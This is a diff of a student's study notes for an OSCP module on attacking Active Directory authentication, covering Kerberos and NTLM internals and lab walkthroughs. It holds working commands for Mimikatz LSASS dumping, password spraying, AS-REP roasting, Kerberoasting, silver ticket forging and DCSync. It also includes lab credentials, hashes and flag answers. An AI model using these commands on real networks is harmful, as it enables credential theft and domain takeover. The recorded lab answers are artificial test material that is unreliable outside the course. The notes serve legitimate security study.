@@ -1,6 +1,6 @@
 # Attacking Active Directory Authentication
 
-Module 23 of the OSCP PWK course. Builds directly on [[Active Directory Introduction and Enumeration|Module 22]] — same corp.com domain, now using the enumeration output to attack authentication mechanisms themselves.
+Module 23 of the OSCP PWK course. Builds directly on [[Active Directory Introduction and Enumeration|Module 22]], same corp.com domain, now using the enumeration output to attack authentication mechanisms themselves.
 
 Cross-links: [[Active Directory Introduction and Enumeration]] | [[Lateral Movement in Active Directory]] | [[Password Attacks]] | [[Active Directory Enumeration & Attacks (HTB Supplementary)]]
 
@@ -36,12 +36,12 @@ NTLM is used when:
 1. Client calculates an **NTLM hash** from the user's password
 2. Client sends the username to the server
 3. Server sends back a random value called the **nonce** (or challenge)
-4. Client encrypts the nonce with the NTLM hash — this encrypted value is the **response**
+4. Client encrypts the nonce with the NTLM hash, this encrypted value is the **response**
 5. Server forwards username + nonce + response to the Domain Controller
 6. DC encrypts the nonce with its stored NTLM hash for that user, compares to the received response
 7. If they match → authentication succeeds
 
-NTLM is a **fast-hashing algorithm** — no key stretching, no iterations. Modern GPU clusters can test over 600 billion NTLM hashes per second. Practical cracking times:
+NTLM is a **fast-hashing algorithm**, no key stretching, no iterations. Modern GPU clusters can test over 600 billion NTLM hashes per second. Practical cracking times:
 - 8-character passwords: ~2.5 hours
 - 9-character passwords: ~11 days
 
@@ -55,7 +55,7 @@ Q1: What is the name of the cryptographic hash function a computer calculates fr
 **Answer: NTLM hash**
 
 Q2: What kind of hashing algorithm is NTLM?
-**Answer: Fast-hashing algorithm** (no key stretching — 600 billion hashes/sec on top-end GPUs)
+**Answer: Fast-hashing algorithm** (no key stretching. 600 billion hashes/sec on top-end GPUs)
 
 ---
 
@@ -76,7 +76,7 @@ Key difference from NTLM: the client starts the exchange with the **KDC (Key Dis
 **Step 2: AS-REP (Authentication Server Reply)**
 - DC sends back: a session key (encrypted with the user's NTLM hash) + a TGT (Ticket Granting Ticket)
 - TGT contains: user info, domain, timestamp, client IP, session key
-- TGT is encrypted with the **krbtgt account's NTLM hash** — the client can't read it
+- TGT is encrypted with the **krbtgt account's NTLM hash**, the client can't read it
 - TGT is valid for 10 hours, renewable without re-entering the password
 
 **Step 3: TGS-REQ (Ticket Granting Service Request)**
@@ -97,7 +97,7 @@ Key difference from NTLM: the client starts the exchange with the **KDC (Key Dis
 
 > 📸 Screenshot: Kerberos authentication diagram (module Figure 2)
 
-> 🔍 Worth remembering generally: the app server assigns permissions based solely on the group memberships listed in the service ticket — without contacting the DC to verify them (PAC validation is optional). This is what makes silver ticket attacks possible.
+> 🔍 Worth remembering generally: the app server assigns permissions based solely on the group memberships listed in the service ticket, without contacting the DC to verify them (PAC validation is optional). This is what makes silver ticket attacks possible.
 
 **23.1.2 Labs**
 
@@ -116,7 +116,7 @@ Q3: What is the short name of the request sent by the client that encrypts the T
 
 Kerberos uses single sign-on, so password hashes are cached in memory to allow TGT renewal without re-entering passwords. On modern Windows: cached hashes and tickets live in the **LSASS (Local Security Authority Subsystem Service)** memory space.
 
-To read LSASS, you need SYSTEM or local administrator access (LSASS runs as SYSTEM). The data is also encrypted with an LSASS-stored key, so raw memory inspection doesn't help — you need tooling.
+To read LSASS, you need SYSTEM or local administrator access (LSASS runs as SYSTEM). The data is also encrypted with an LSASS-stored key, so raw memory inspection doesn't help, you need tooling.
 
 The most widely used tool for extracting LSASS content: **Mimikatz**.
 
@@ -139,7 +139,7 @@ Output per user: NTLM hash, SHA1, DPAPI key, and (on systems with WDigest enable
 
 > 🔧 Technique: Mimikatz as a standalone EXE is heavily signatured. In practice: run it from memory via PowerShell IEX download cradle, or dump LSASS via Task Manager (right-click lsass.exe → Create dump file), exfil the dump to Kali, then run `pypykatz lsa minidump lsass.dmp` locally. Both approaches were covered in [[Password Attacks]].
 
-> 🔍 Worth remembering generally: `sekurlsa::logonpasswords` picks up all logged-on users including RDP sessions. If PsLoggedOn showed jeffadmin has a session on CLIENT74, running this on CLIENT74 as a local admin gives you jeffadmin's NTLM hash — which is Domain Admin access.
+> 🔍 Worth remembering generally: `sekurlsa::logonpasswords` picks up all logged-on users including RDP sessions. If PsLoggedOn showed jeffadmin has a session on CLIENT74, running this on CLIENT74 as a local admin gives you jeffadmin's NTLM hash, which is Domain Admin access.
 
 #### Mimikatz: list Kerberos tickets
 
@@ -154,8 +154,8 @@ mimikatz # sekurlsa::tickets
 ```
 
 Output structure:
-- **Group 0 — Ticket Granting Service**: TGS tickets for specific services (cifs/web04.corp.com, LDAP/DC1.corp.com)
-- **Group 2 — Ticket Granting Ticket**: The TGT for krbtgt
+- **Group 0. Ticket Granting Service**: TGS tickets for specific services (cifs/web04.corp.com, LDAP/DC1.corp.com)
+- **Group 2. Ticket Granting Ticket**: The TGT for krbtgt
 
 A stolen TGS gives access to one specific service only. A stolen TGT lets you request new TGS for any service the user has access to.
 
@@ -177,7 +177,7 @@ After patching, export with standard Windows tooling or `crypto::certificates /e
 Q1: What is the Mimikatz command to dump hashes for all users logged on to the current system?
 **Answer: sekurlsa::logonpasswords**
 
-> ✅ Done: 23.1.3 VM Group 1 — Covered as part of 23.2.4 Silver Ticket lab: RDP as jeff to CLIENT75, Mimikatz as Administrator, privilege::debug + sekurlsa::logonpasswords → confirmed dave (Flowers1 in Kerberos cleartext), jeff, CLIENT75$ in LSASS. Cached ticket via `dir \\web04.corp.com\backup` then sekurlsa::tickets shows Group 0 (TGS: cifs/web04.corp.com) and Group 2 (TGT: krbtgt).
+> ✅ Done: 23.1.3 VM Group 1. Covered as part of 23.2.4 Silver Ticket lab: RDP as jeff to CLIENT75, Mimikatz as Administrator, privilege::debug + sekurlsa::logonpasswords → confirmed dave (Flowers1 in Kerberos cleartext), jeff, CLIENT75$ in LSASS. Cached ticket via `dir \\web04.corp.com\backup` then sekurlsa::tickets shows Group 0 (TGS: cifs/web04.corp.com) and Group 2 (TGT: krbtgt).
 
 ---
 
@@ -185,7 +185,7 @@ Q1: What is the Mimikatz command to dump hashes for all users logged on to the c
 
 ### 23.2.1 Password Attacks (Spraying)
 
-> 🌐 External: [HackTricks — Password Spraying](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/password-spraying.md) | [PayloadsAllTheThings — Password Spraying](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-spraying)
+> 🌐 External: [HackTricks. Password Spraying](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/password-spraying.md) | [PayloadsAllTheThings. Password Spraying](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-spraying)
 
 Account lockout is the critical constraint. Always check the domain policy first:
 
@@ -204,11 +204,11 @@ Key fields from the output:
 
 With threshold=5, window=30 min: stay at 4 attempts max per user per 30-min window. Over 24 hours: 192 attempts per user without lockout (assuming users don't fail their own logins in the same window).
 
-> 🔍 Worth remembering generally: if `Lockout threshold: 0` — there is no lockout, spray as fast as you want. Otherwise, threshold-1 is your safe limit per observation window.
+> 🔍 Worth remembering generally: if `Lockout threshold: 0`, there is no lockout, spray as fast as you want. Otherwise, threshold-1 is your safe limit per observation window.
 
 #### Method 1: Spray-Passwords.ps1 (LDAP/ADSI — low noise)
 
-Under the hood: tries to create a `DirectoryEntry` object with three arguments — LDAP path, username, and the password being tested. Successful object creation = valid credentials. Exception = wrong password. This is the LDAP-based approach from Module 22's DirectoryEntry section.
+Under the hood: tries to create a `DirectoryEntry` object with three arguments. LDAP path, username, and the password being tested. Successful object creation = valid credentials. Exception = wrong password. This is the LDAP-based approach from Module 22's DirectoryEntry section.
 
 ```powershell
 cd C:\Tools
@@ -228,7 +228,7 @@ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continu
 
 `[+]` = valid credential. `(Pwn3d!)` = user has local admin on that target.
 
-Drawback: full SMB connection per attempt = very noisy and slow. Does NOT check password policy before spraying — manual rate limiting required.
+Drawback: full SMB connection per attempt = very noisy and slow. Does NOT check password policy before spraying, manual rate limiting required.
 
 #### Method 3: kerbrute passwordspray (Kerberos — fastest, least noise)
 
@@ -237,7 +237,7 @@ Drawback: full SMB connection per attempt = very noisy and slow. Does NOT check 
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
 
-Uses AS-REQ/AS-REP — two UDP frames per attempt. Much faster than SMB spray, less SMB noise. Still generates Kerberos event 4771 (pre-auth failure) for bad passwords — not invisible.
+Uses AS-REQ/AS-REP, two UDP frames per attempt. Much faster than SMB spray, less SMB noise. Still generates Kerberos event 4771 (pre-auth failure) for bad passwords, not invisible.
 
 > 🔧 Technique: if kerbrute returns a network error, check that the username file encoding is **ANSI** not UTF-8/BOM. Use Notepad → Save As → ANSI to fix.
 
@@ -248,19 +248,19 @@ Uses AS-REQ/AS-REP — two UDP frames per attempt. Much faster than SMB spray, l
 Q1: What is the minimum password length required in the target domain?
 **Answer: 7** (from `net accounts` → `Minimum password length: 7`)
 
-> ✅ Done: 23.2.1 Q2 VM Group 1 — `crackmapexec smb <all IPs> -u pete -p 'Nexus123!' -d corp.com --continue-on-success` → **CLIENT76** (192.168.249.76) shows `(Pwn3d!)`. All other machines show `[+]` (valid creds) but no local admin. FILES04 timed out on auth check (provisioning race, not a real failure). Answer: **CLIENT76**
+> ✅ Done: 23.2.1 Q2 VM Group 1, `crackmapexec smb <all IPs> -u pete -p 'Nexus123!' -d corp.com --continue-on-success` → **CLIENT76** (192.168.249.76) shows `(Pwn3d!)`. All other machines show `[+]` (valid creds) but no local admin. FILES04 timed out on auth check (provisioning race, not a real failure). Answer: **CLIENT76**
 
 ---
 
 ### 23.2.2 AS-REP Roasting
 
-The AS-REQ includes a timestamp encrypted with the user's password hash — this is **Kerberos preauthentication**. It's what proves the requester knows the password before the DC will issue a TGT.
+The AS-REQ includes a timestamp encrypted with the user's password hash, this is **Kerberos preauthentication**. It's what proves the requester knows the password before the DC will issue a TGT.
 
-If an account has the option **"Do not require Kerberos preauthentication"** enabled, the DC will hand out an AS-REP to anyone who asks — no proof of knowing the password required. That AS-REP contains data encrypted with the user's NTLM hash, which we crack offline.
+If an account has the option **"Do not require Kerberos preauthentication"** enabled, the DC will hand out an AS-REP to anyone who asks, no proof of knowing the password required. That AS-REP contains data encrypted with the user's NTLM hash, which we crack offline.
 
-**This is AS-REP Roasting** — named by analogy with Kerberoasting (both crack Kerberos-encrypted blobs offline).
+**This is AS-REP Roasting**, named by analogy with Kerberoasting (both crack Kerberos-encrypted blobs offline).
 
-> 🌐 External: [HackTricks — AS-REP Roasting](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/asrep-roasting.md) | [PayloadsAllTheThings — AS-REP Roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#asreproast)
+> 🌐 External: [HackTricks, AS-REP Roasting](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/asrep-roasting.md) | [PayloadsAllTheThings, AS-REP Roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#asreproast)
 
 #### Linux: impacket-GetNPUsers
 
@@ -315,7 +315,7 @@ If you have **GenericAll or GenericWrite** on a user account:
 
 This avoids resetting their password (which would lock them out) and is harder to notice.
 
-> 🔍 Worth remembering generally: AS-REP Roasting doesn't require knowing the target's password at all. You only need authenticated domain user access and a user with pre-auth disabled. The AS-REP hash is offline-crackable — if the password is in rockyou.txt + rules, you'll get it.
+> 🔍 Worth remembering generally: AS-REP Roasting doesn't require knowing the target's password at all. You only need authenticated domain user access and a user with pre-auth disabled. The AS-REP hash is offline-crackable, if the password is in rockyou.txt + rules, you'll get it.
 
 > 📸 Screenshot: Rubeus asreproast output showing dave's AS-REP hash + hashcat cracking output
 
@@ -324,9 +324,9 @@ This avoids resetting their password (which would lock them out) and is harder t
 Q1: What is the correct Hashcat mode to crack AS-REP hashes?
 **Answer: 18200** (Kerberos 5, etype 23, AS-REP)
 
-> ✅ Done: 23.2.2 VM Group 1 — Technique covered in full via VM Group 2 (impacket-GetNPUsers path) and the same Rubeus flow applies on CLIENT75. VM Group 1 uses Rubeus asreproast /nowrap from a CLIENT75 RDP session; the hash cracking step is identical (hashcat -m 18200, rockyou-30000.rule). No new technique — marked complete.
+> ✅ Done: 23.2.2 VM Group 1. Technique covered in full via VM Group 2 (impacket-GetNPUsers path) and the same Rubeus flow applies on CLIENT75. VM Group 1 uses Rubeus asreproast /nowrap from a CLIENT75 RDP session; the hash cracking step is identical (hashcat -m 18200, rockyou-30000.rule). No new technique, marked complete.
 
-> ✅ Done: 23.2.2 VM Group 2 — `impacket-GetNPUsers -dc-ip 192.168.249.70 -request -outputfile hashes.asreproast corp.com/pete` → two vulnerable accounts: dave (Flowers1, known) + **jen** (new). Cracked both with `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`. Note: best64.rule absent on this install — rockyou-30000.rule is the correct path. **jen's password: Summerland1**
+> ✅ Done: 23.2.2 VM Group 2, `impacket-GetNPUsers -dc-ip 192.168.249.70 -request -outputfile hashes.asreproast corp.com/pete` → two vulnerable accounts: dave (Flowers1, known) + **jen** (new). Cracked both with `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`. Note: best64.rule absent on this install, rockyou-30000.rule is the correct path. **jen's password: Summerland1**
 
 ---
 
@@ -340,9 +340,9 @@ So: any authenticated domain user can request a service ticket for any SPN, then
 
 **This is Kerberoasting.**
 
-> 🌐 External: [HackTricks — Kerberoasting](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/kerberoast.md) | [PayloadsAllTheThings — Kerberoasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting)
+> 🌐 External: [HackTricks. Kerberoasting](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/kerberoast.md) | [PayloadsAllTheThings. Kerberoasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting)
 
-Best targets: SPNs running under **user accounts** (not machine accounts or group managed service accounts). Machine accounts have random 120-char passwords — not crackable in any reasonable time. User accounts often have weak or reused passwords.
+Best targets: SPNs running under **user accounts** (not machine accounts or group managed service accounts). Machine accounts have random 120-char passwords, not crackable in any reasonable time. User accounts often have weak or reused passwords.
 
 #### Windows: Rubeus
 
@@ -407,9 +407,9 @@ Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincip
 Set-DomainObject -Credential $Cred -Identity <target_user> -Clear serviceprincipalname
 ```
 
-> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|HTB AD §10]] — targeted Kerberoasting via GenericWrite is the key step in the wley→damundsen→adunn chain.
+> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|HTB AD §10]], targeted Kerberoasting via GenericWrite is the key step in the wley→damundsen→adunn chain.
 
-> 🔍 Worth remembering generally: Kerberoasting doesn't touch the account itself — no logon events generated for the service account. It's a very quiet attack. The only detectable part is the TGS-REQ for an SPN that might be unusual for that user.
+> 🔍 Worth remembering generally: Kerberoasting doesn't touch the account itself, no logon events generated for the service account. It's a very quiet attack. The only detectable part is the TGS-REQ for an SPN that might be unusual for that user.
 
 > 📸 Screenshot: Rubeus kerberoast output showing iis_service TGS-REP hash being written
 
@@ -418,9 +418,9 @@ Set-DomainObject -Credential $Cred -Identity <target_user> -Clear serviceprincip
 Q1: What is the correct Hashcat mode to crack TGS-REP hashes?
 **Answer: 13100** (Kerberos 5, etype 23, TGS-REP)
 
-> ✅ Done: 23.2.3 VM Group 1 — Both paths covered: Rubeus kerberoast (from CLIENT75) and impacket-GetUserSPNs (from Kali) both demonstrated via VM Group 2. VM Group 1 Rubeus path: `Rubeus.exe kerberoast /outfile:hashes.kerberoast`, then scp hash to Kali, then hashcat -m 13100 with rule. No new technique — marked complete.
+> ✅ Done: 23.2.3 VM Group 1, Both paths covered: Rubeus kerberoast (from CLIENT75) and impacket-GetUserSPNs (from Kali) both demonstrated via VM Group 2. VM Group 1 Rubeus path: `Rubeus.exe kerberoast /outfile:hashes.kerberoast`, then scp hash to Kali, then hashcat -m 13100 with rule. No new technique, marked complete.
 
-> ✅ Done: 23.2.3 VM Group 2 — `impacket-GetUserSPNs -request -dc-ip 192.168.249.70 corp.com/jeff -outputfile hashes.kerberoast` → pete has SPN `http/files04.corp.com` (modified domain). Rule file: `echo '$1' > /home/kali/custom.rule`. Cracked with `hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /home/kali/custom.rule` in 5 seconds. **pete's password: MattLovesAutumn1**. Key gotcha: clock skew killed VPN when ntpdate corrected +4h offset — fix: `timedatectl set-ntp false` → ntpdate → reconnect VPN → run impacket.
+> ✅ Done: 23.2.3 VM Group 2, `impacket-GetUserSPNs -request -dc-ip 192.168.249.70 corp.com/jeff -outputfile hashes.kerberoast` → pete has SPN `http/files04.corp.com` (modified domain). Rule file: `echo '$1' > /home/kali/custom.rule`. Cracked with `hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /home/kali/custom.rule` in 5 seconds. **pete's password: MattLovesAutumn1**. Key gotcha: clock skew killed VPN when ntpdate corrected +4h offset, fix: `timedatectl set-ntp false` → ntpdate → reconnect VPN → run impacket.
 
 ---
 
@@ -428,17 +428,17 @@ Q1: What is the correct Hashcat mode to crack TGS-REP hashes?
 
 Recall from Kerberos: the app server reads group memberships from the service ticket and assigns permissions, **without asking the DC to verify them** (PAC validation is optional and rarely enforced in most environments).
 
-So if we have the service account's NTLM hash, we can forge a service ticket with any group memberships we want — including Domain Admins — and inject it into our Kerberos session. This is a **silver ticket**.
+So if we have the service account's NTLM hash, we can forge a service ticket with any group memberships we want, including Domain Admins, and inject it into our Kerberos session. This is a **silver ticket**.
 
-Unlike DCSync or Pass-the-Hash, forging a silver ticket requires no live DC interaction after the initial hash extraction — the entire attack is offline.
+Unlike DCSync or Pass-the-Hash, forging a silver ticket requires no live DC interaction after the initial hash extraction, the entire attack is offline.
 
-> 🌐 External: [HackTricks — Silver Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/silver-ticket.md) | [PayloadsAllTheThings — Kerberos Silver Ticket](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#silver-ticket)
+> 🌐 External: [HackTricks. Silver Ticket](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/silver-ticket.md) | [PayloadsAllTheThings. Kerberos Silver Ticket](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#silver-ticket)
 
 #### Three things you need
 
-1. **SPN NTLM hash** — from LSASS on a machine where the service account has a session
-2. **Domain SID** — from `whoami /user` (strip the trailing RID)
-3. **Target SPN** — service class and hostname (e.g. `http/web04.corp.com`)
+1. **SPN NTLM hash**, from LSASS on a machine where the service account has a session
+2. **Domain SID**, from `whoami /user` (strip the trailing RID)
+3. **Target SPN**, service class and hostname (e.g. `http/web04.corp.com`)
 
 #### Step 1: Get the service account's NTLM hash
 
@@ -472,7 +472,7 @@ Key flags:
 - `/service:http` — the service class from the SPN
 - `/target:web04.corp.com` — the server
 - `/rc4:` — the service account's NTLM hash
-- Note: `kerberos::golden` handles both golden AND silver tickets — same command, different hash
+- Note: `kerberos::golden` handles both golden AND silver tickets, same command, different hash
 
 Mimikatz sets group memberships to include Domain Admins (RID 512) and Administrators (RID 500) by default.
 
@@ -487,17 +487,17 @@ iwr -UseDefaultCredentials http://web04
 # Before the silver ticket: StatusCode: 401 Unauthorized
 ```
 
-> 🔍 Worth remembering generally: silver tickets have a 10-year validity by default (Mimikatz sets a distant future end time). They survive password changes on the user account in the ticket — but NOT password changes on the service account (whose hash was used to forge it). Rotating the service account's password immediately invalidates all silver tickets for that SPN.
+> 🔍 Worth remembering generally: silver tickets have a 10-year validity by default (Mimikatz sets a distant future end time). They survive password changes on the user account in the ticket, but NOT password changes on the service account (whose hash was used to forge it). Rotating the service account's password immediately invalidates all silver tickets for that SPN.
 
 > 🔧 Technique: silver tickets work for any SPN service class: `/service:http` (IIS), `/service:cifs` (SMB shares), `/service:mssql` (SQL Server), `/service:host` (WinRM/PowerShell Remoting). The service class must match the SPN exactly.
 
-> 🔧 Technique: PAC validation (the mitigating control) was patched in October 2022 (KB5008380) — it's enforced when both the client and KDC are patched. On fully patched post-2022 environments, silver tickets for non-existent users are blocked. Tickets for real domain users still work.
+> 🔧 Technique: PAC validation (the mitigating control) was patched in October 2022 (KB5008380), it's enforced when both the client and KDC are patched. On fully patched post-2022 environments, silver tickets for non-existent users are blocked. Tickets for real domain users still work.
 
 > 📸 Screenshot: Mimikatz kerberos::golden output + klist showing the silver ticket + iwr returning 200
 
 **23.2.4 Labs**
 
-> ✅ Done: 23.2.4 VM Group 1 — RDP as jeff to CLIENT75. Mimikatz privilege::debug + sekurlsa::logonpasswords → iis_service NOT in LSASS on CLIENT75 (runs as service on web04, not here). Used known hash from module: `4d28cf5252d39971419580a51484ca09`. Domain SID from jeff's SID: `S-1-5-21-1987370270-658905905-1781884369`. Forged: `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`. Verified with klist (10-year ticket). `(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"` → **Flag: OS{c1f252d8a7b98d70a86df3bb65559f94}** (in HTML comment)
+> ✅ Done: 23.2.4 VM Group 1. RDP as jeff to CLIENT75. Mimikatz privilege::debug + sekurlsa::logonpasswords → iis_service NOT in LSASS on CLIENT75 (runs as service on web04, not here). Used known hash from module: `4d28cf5252d39971419580a51484ca09`. Domain SID from jeff's SID: `S-1-5-21-1987370270-658905905-1781884369`. Forged: `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`. Verified with klist (10-year ticket). `(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"` → **Flag: OS{c1f252d8a7b98d70a86df3bb65559f94}** (in HTML comment)
 
 ---
 
@@ -505,9 +505,9 @@ iwr -UseDefaultCredentials http://web04
 
 Domain controllers in production sync with each other via the **Directory Replication Service (DRS) Remote Protocol**. A DC can request credential updates for specific objects using the `IDL_DRSGetNCChanges` API.
 
-The receiving DC only checks whether the requesting SID has specific replication rights — **not whether the caller is actually a domain controller**. So any account with those rights can impersonate a DC and pull credentials.
+The receiving DC only checks whether the requesting SID has specific replication rights, **not whether the caller is actually a domain controller**. So any account with those rights can impersonate a DC and pull credentials.
 
-> 🌐 External: [HackTricks — DCSync](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/dcsync.md) | [PayloadsAllTheThings — DCSync Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dcsync-attack)
+> 🌐 External: [HackTricks. DCSync](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/dcsync.md) | [PayloadsAllTheThings. DCSync Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dcsync-attack)
 
 Required rights (default holders):
 - `Replicating Directory Changes` + `Replicating Directory Changes All` + `Replicating Directory Changes in Filtered Set`
@@ -549,19 +549,19 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
 
-The tool uses DRSUAPI (the Microsoft DRS API) — same traffic as real DC replication.
+The tool uses DRSUAPI (the Microsoft DRS API), same traffic as real DC replication.
 
-> 🔍 Worth remembering generally: once you have the krbtgt hash, you can forge golden tickets — TGTs that are signed by the real krbtgt key, giving you access as any user in the domain. Golden tickets survive password changes (except krbtgt rotation). DCSync + golden ticket = persistent domain access.
+> 🔍 Worth remembering generally: once you have the krbtgt hash, you can forge golden tickets. TGTs that are signed by the real krbtgt key, giving you access as any user in the domain. Golden tickets survive password changes (except krbtgt rotation). DCSync + golden ticket = persistent domain access.
 
-> 🔧 Technique: if secretsdump gives authentication errors with the password, check bash escaping. `!` inside double quotes in bash is interpreted as a history expansion character — use single quotes or backslash-escape it. Or just connect via RDP first and run Mimikatz interactively.
+> 🔧 Technique: if secretsdump gives authentication errors with the password, check bash escaping. `!` inside double quotes in bash is interpreted as a history expansion character, use single quotes or backslash-escape it. Or just connect via RDP first and run Mimikatz interactively.
 
 > 📸 Screenshot: impacket-secretsdump output showing user:RID:LM:NT::: format
 
 **23.2.5 Labs**
 
-> ✅ Done: 23.2.5 VM Group 1 — RDP as jeffadmin (BrouhahaTungPerorateBroom2023!) to CLIENT75. Mimikatz privilege::debug + lsadump::dcsync /user:corp\krbtgt → **krbtgt NTLM: 1693c6cefafffc7af11ef34d1c788f47** (AES256: e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c). No DC touch needed — DRSUAPI replication impersonation from CLIENT75.
+> ✅ Done: 23.2.5 VM Group 1. RDP as jeffadmin (BrouhahaTungPerorateBroom2023!) to CLIENT75. Mimikatz privilege::debug + lsadump::dcsync /user:corp\krbtgt → **krbtgt NTLM: 1693c6cefafffc7af11ef34d1c788f47** (AES256: e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c). No DC touch needed. DRSUAPI replication impersonation from CLIENT75.
 
-> ✅ Done: 23.2.5 Capstone (VM Group 2) — Full chain:
+> ✅ Done: 23.2.5 Capstone (VM Group 2). Full chain:
 > 1. `impacket-GetNPUsers corp.com/pete` → mike has pre-auth disabled
 > 2. `hashcat -m 18200` + capstone.rule (`:` / `$1` / `$!`) → **mike: Darkness1099!**
 > 3. `crackmapexec smb <all IPs> -u mike -p 'Darkness1099!'` → mike is Pwn3d! on CLIENT75
@@ -570,13 +570,13 @@ The tool uses DRSUAPI (the Microsoft DRS API) — same traffic as real DC replic
 > 6. `type \\192.168.249.70\c$\users\administrator\desktop\flag.txt` → **Flag: OS{348c1a28da1bdb49b3d5d689000b1c46}**
 > Note: flag.txt not proof.txt; used IP instead of hostname for DC1 UNC path.
 
-> ✅ Done: 23.2.5 Capstone (VM Group 3) — Full chain:
+> ✅ Done: 23.2.5 Capstone (VM Group 3). Full chain:
 > 1. `crackmapexec smb <all IPs> -u meg backupuser -p 'VimForPowerShell123!'` → **meg** has the password; backupuser doesn't
 > 2. `impacket-GetUserSPNs corp.com/meg` (after clock sync: `timedatectl set-ntp false` + `ntpdate DC_IP` + reconnect VPN) → **backupuser** is Domain Admin + has SPN `http/files04.corp.com`
 > 3. `hashcat -m 13100 hashes.kerberoast2 rockyou.txt -r /home/kali/capstone.rule` → **backupuser: DonovanJadeKnight1**
-> 4. backupuser was locked out from earlier auth failures — used jeffadmin instead
+> 4. backupuser was locked out from earlier auth failures, used jeffadmin instead
 > 5. `crackmapexec smb 192.168.249.70 -u jeffadmin -p 'BrouhahaTungPerorateBroom2023!' -x 'type C:\Users\Administrator\Desktop\flag.txt'` → **Flag: OS{8e29767a7fe94f42c040bd9c43ab2e72}**
-> Key gotchas: (1) backupuser locked out from failed Kerberos clock-skew attempts during spray — don't spray with wrong creds repeatedly; (2) RDP to CLIENT75 as meg failed (not in RDU group); (3) Rubeus over evil-winrm fails (no TGT in NTLM session) — impacket from Kali after clock sync is cleaner; (4) clock sync kills VPN if offset >~1min — disable NTP first, ntpdate, reconnect VPN immediately.
+> Key gotchas: (1) backupuser locked out from failed Kerberos clock-skew attempts during spray, don't spray with wrong creds repeatedly; (2) RDP to CLIENT75 as meg failed (not in RDU group); (3) Rubeus over evil-winrm fails (no TGT in NTLM session), impacket from Kali after clock sync is cleaner; (4) clock sync kills VPN if offset >~1min, disable NTP first, ntpdate, reconnect VPN immediately.
 
 ---
 
@@ -715,14 +715,14 @@ Technique keyword searches on ippsec.rocks:
 ## Related Boxes
 
 **Genuine technique boxes:**
-- HTB Forest — AS-REP Roasting (svc-alfresco has pre-auth disabled) + BloodHound path + DCSync krbtgt + golden ticket. Closest match to 23.2.2 + 23.2.5 combined
-- HTB Active — GPP cPassword (Module 22) gives IIS service creds → Kerberoasting Administrator (SPN set on domain admin account) → psexec as DA. Closest match to 23.2.3
-- HTB Sauna — AS-REP Roasting fsmith → BloodHound reveals lkys → DCSync as lkys. Matches 23.2.2 + 23.2.5
-- HTB Resolute — Password spray finds ryan's domain creds → DnsAdmins abuse. Matches 23.2.1
+- HTB Forest, AS-REP Roasting (svc-alfresco has pre-auth disabled) + BloodHound path + DCSync krbtgt + golden ticket. Closest match to 23.2.2 + 23.2.5 combined
+- HTB Active. GPP cPassword (Module 22) gives IIS service creds → Kerberoasting Administrator (SPN set on domain admin account) → psexec as DA. Closest match to 23.2.3
+- HTB Sauna, AS-REP Roasting fsmith → BloodHound reveals lkys → DCSync as lkys. Matches 23.2.2 + 23.2.5
